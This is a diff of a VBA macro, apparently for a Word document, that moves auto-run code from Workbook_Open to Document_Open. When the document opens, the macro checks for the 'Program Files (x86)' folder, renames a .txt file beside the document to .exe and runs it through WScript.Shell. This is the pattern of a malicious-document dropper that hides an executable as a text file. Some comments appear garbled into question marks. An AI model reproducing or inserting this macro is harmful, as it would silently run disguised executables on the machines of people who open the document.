@@ -1,31 +1,44 @@
-Private Sub Workbook_Open()
-Dim sFileName64 As String, sNewFileName64 As String
-Dim sFileName32 As String, sNewFileName32 As String 
+Function DirectoryExists(directory As String) As Boolean
+    DirectoryExists = False
+    If Not Dir(directory, vbDirectory) = "" Then
+        If GetAttr(directory) = vbDirectory Then
+            DirectoryExists = True
+        End If
+    End If
+End Function
 
-If Dir("C:/Program\ Files\ (x86)" & "/" client, vbDirectory) = "" Then
-  
-    sFileName64 = ThisWorkbook.Path & "\gos64.txt"    'name of current file
-    sNewFileName64 = ThisWorkbook.Path & "\gos64.exe"     'filename to rename
-    'If Dir(sFileName, 16) = "" Then MsgBox "Нет такого файла", vbCritical, "error": Exit Sub
+Private Sub Document_Open()
+Dim sFileName64 As String, sNewFileName64 As String
+Dim sFileName32 As String, sNewFileName32 As String
+Dim directory As String
+
+directory = "c:\program files (x86)"
+
+If Not DirectoryExists(directory) = False Then
+
+    sFileName64 = ThisDocument.Path & "\test.txt"    'name of current file
+    sNewFileName64 = ThisDocument.Path & "\test.exe"     'filename to rename
+    'If Dir(sFileName, 16) = "" Then MsgBox "??? ?????? ?????", vbCritical, "error": Exit Sub
  
     Name sFileName64 As sNewFileName64 'rename file
     
     'MsgBox "file has been renamed"
  
-    'start test.exe 
+    'start test.exe
     Set WshScript = CreateObject("WScript.Shell")
     D = WshScript.Run(sNewFileName64, 4, False)
-Else 
-    sFileName32 = ThisWorkbook.Path & "\gos32.txt"    'name of current file
-    sNewFileName32 = ThisWorkbook.Path & "\gos32.exe"     'filename to rename
-    'If Dir(sFileName, 16) = "" Then MsgBox "Нет такого файла", vbCritical, "error": Exit Sub
+Else
+      sFileName32 = ThisDocument.Path & "\test1.txt"    'name of current file
+      sNewFileName32 = ThisDocument.Path & "\test1.exe"     'filename to rename
+    'If Dir(sFileName, 16) = "" Then MsgBox "??? ?????? ?????", vbCritical, "error": Exit Sub
  
     Name sFileName32 As sNewFileName32 'rename file
     
     'MsgBox "file has been renamed"
  
-    'start test.exe 
+    'start test.exe
     Set WshScript = CreateObject("WScript.Shell")
-    C = WshScript.Run(sNewFileName32, 4, False)   
+    C = WshScript.Run(sNewFileName32, 4, False)
+
 End If
 End Sub
